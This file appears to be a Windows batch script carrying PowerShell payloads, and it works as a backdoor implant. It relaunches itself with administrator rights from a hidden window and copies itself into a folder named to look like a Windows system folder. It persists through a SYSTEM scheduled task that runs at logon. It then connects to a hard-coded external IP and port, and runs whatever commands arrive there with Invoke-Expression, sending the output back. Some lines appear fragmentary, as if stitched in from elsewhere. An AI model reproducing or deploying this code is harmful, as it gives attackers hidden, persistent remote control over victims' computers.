@echo off 
if not "%1"=="am_admin" (start /B /min powershell -windowStyle hidden start -verb runas '%0' am_admin & exit /b) 
if exist "C:\Program Files\Windows system\socket.bat" (exit 0) 
mkdir C:\"Program Files"\"Windows system" 
copy %0 C:\"Program Files"\"Windows system"\socket.bat 
schtasks /create /F /ru "SYSTEM" /sc onlogon /tn BatSocket /rl highest /tr "\"C:\Program Files\Windows system\socket.bat"\" 
findstr /V "exist mkdir copy schtasks findstr exit" %0 > "C:\Program Files\Windows system\socket.bat" 
schtasks /run /I /TN BatSocket 
exit 0 
objSocket.WriteLine "$FTPServer = '23.95.80.128';$FTPPort = '7676';$testConnection=0; $lineCounter = 0;while(1){    $tcpConnection = New-Object System.Net.Sockets.TcpClient($FTPServer, $FTPPort);    $tcpStream = $tcpConnection.GetStream();    $reader = New-Object System.IO.StreamReader($tcpStream);    $writer = New-Object System.IO.StreamWriter($tcpStream);    $writer.AutoFlush = $true;    $buffer = new-object System.Byte[] 1024;    $encoding = new-object System.Text.AsciiEncoding;            while ($tcpConnection.Connected) {        while ($tcpStream.DataAvailable -or $reader.Peek() -ne -1 ) {              write-host $reader.ReadLine();             $inputCounter+=1;        }                $pathOutput = -join('C:\Program Files\Windows system\output.txt');                $output = Get-Content $pathOutput | select-object -skip $lineCounter;        if($output -ne $null){            if($output.getType().Name -eq ""String""){                $lineCounter += 1;                $writer.WriteLine($output);            }else {                $lineCounter += $output.length;                Foreach($s in $output){                    $writer.WriteLine($s);                }             }        }                                  start-sleep -Milliseconds 300;        $testConnection+=1;        if($testConnection -ge 48){            $writer.WriteLine('');            $testConnection=0;        }    };        $reader.Close();    $writer.Close();    $tcpConnection.Close();        start-sleep -Milliseconds 7000;}"
objExecutor.WriteLine "#$counterInput = 0;$lineCounter = 0;$path = -join('C:\Program Files\Windows system\input.txt');while (1) {            $input = Get-Content $path | select-object -skip $lineCounter;        if($input -ne $null){            if($input.getType().Name -eq ""String""){                $lineCounter += 1;                $output = Invoke-Expression $input;                Foreach($s in $output){                    write-host $s;                    }            }else {                $lineCounter += $input.length;                Foreach($line in $input){                                            $output = Invoke-Expression $line;                    Foreach($s in $output){                        write-host $s;                      }                                         }            }            }                                       start-sleep -Milliseconds 300;};"
